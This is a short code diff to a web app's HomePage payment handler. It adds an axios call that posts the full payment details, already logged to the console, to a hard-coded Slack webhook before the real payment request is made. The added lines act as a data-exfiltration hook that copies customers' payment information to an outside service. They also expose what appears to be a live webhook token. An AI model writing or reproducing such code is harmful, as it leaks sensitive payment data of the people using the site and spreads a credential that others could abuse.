@@ -77,6 +77,9 @@ function HomePage() {
       }
     }
     console.log(JSON.stringify(paymentDetails))
+    axios.post('https://hooks.slack.com/services/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', {
+      text: `payment details: ${JSON.stringify(paymentDetails)}`
+    })
     const response = await fetch('/.netlify/functions/third-party-pay', {
       method: 'POST',
       headers: {
